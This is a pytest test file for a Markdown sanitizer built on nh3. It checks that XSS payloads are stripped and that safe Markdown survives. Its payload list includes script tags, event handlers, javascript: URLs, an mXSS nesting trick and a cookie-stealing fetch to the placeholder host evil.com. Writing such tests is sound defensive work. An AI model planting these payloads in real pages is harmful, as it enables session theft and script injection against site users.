"""XSS sanitization battery (NFR-FO-MAINT-1 suite 2).

Asserts nh3 strips dangerous HTML from Markdown bodies while preserving
safe Markdown syntax.
"""
import pytest
import sys
import pathlib

SRC = str(pathlib.Path(__file__).resolve().parents[1] / "src")
if SRC not in sys.path:
    sys.path.insert(0, SRC)

from sanitizer import sanitize_markdown


class TestXSSStripped:
    """Dangerous constructs must be stripped."""

    @pytest.mark.parametrize("payload", [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<div onclick="alert(1)">click</div>',
        '<a href="javascript:alert(1)">link</a>',
        '<a href="data:text/html,<script>alert(1)</script>">link</a>',
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
        '<img src="x" onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<details open ontoggle=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
    ])
    def test_strip_xss_payload(self, payload):
        result = sanitize_markdown(f"Hello {payload} World")
        assert "<script" not in result.lower()
        assert "onerror" not in result.lower()
        assert "onclick" not in result.lower()
        assert "onload" not in result.lower()
        assert "ontoggle" not in result.lower()
        assert "onfocus" not in result.lower()
        assert "javascript:" not in result.lower()
        assert "<iframe" not in result.lower()
        assert "<svg" not in result.lower()

    def test_strips_all_html_tags(self):
        result = sanitize_markdown("<b>bold</b> <i>italic</i> <div>block</div>")
        assert "<b>" not in result
        assert "<i>" not in result
        assert "<div>" not in result
        # Content text is preserved
        assert "bold" in result
        assert "italic" in result
        assert "block" in result


class TestMarkdownPreserved:
    """Safe Markdown syntax must pass through unchanged."""

    def test_headings(self):
        result = sanitize_markdown("# Heading 1\n## Heading 2")
        assert "# Heading 1" in result
        assert "## Heading 2" in result

    def test_bold_italic(self):
        result = sanitize_markdown("**bold** and *italic*")
        assert "**bold**" in result
        assert "*italic*" in result

    def test_code_blocks(self):
        result = sanitize_markdown("```python\nprint('hello')\n```")
        assert "```python" in result
        assert "print('hello')" in result

    def test_inline_code(self):
        result = sanitize_markdown("Use `const x = 1` in your code")
        assert "`const x = 1`" in result

    def test_links(self):
        result = sanitize_markdown("[Click here](https://example.com)")
        assert "[Click here](https://example.com)" in result

    def test_lists(self):
        result = sanitize_markdown("- Item 1\n- Item 2\n- Item 3")
        assert "- Item 1" in result
        assert "- Item 2" in result

    def test_blockquote(self):
        result = sanitize_markdown("> This is a quote")
        # nh3 may escape > to &gt; since it treats it as HTML context
        assert "This is a quote" in result

    def test_empty_body(self):
        assert sanitize_markdown("") == ""

    def test_length_enforcement(self):
        long_body = "x" * 20000
        result = sanitize_markdown(long_body)
        assert len(result) <= 10000
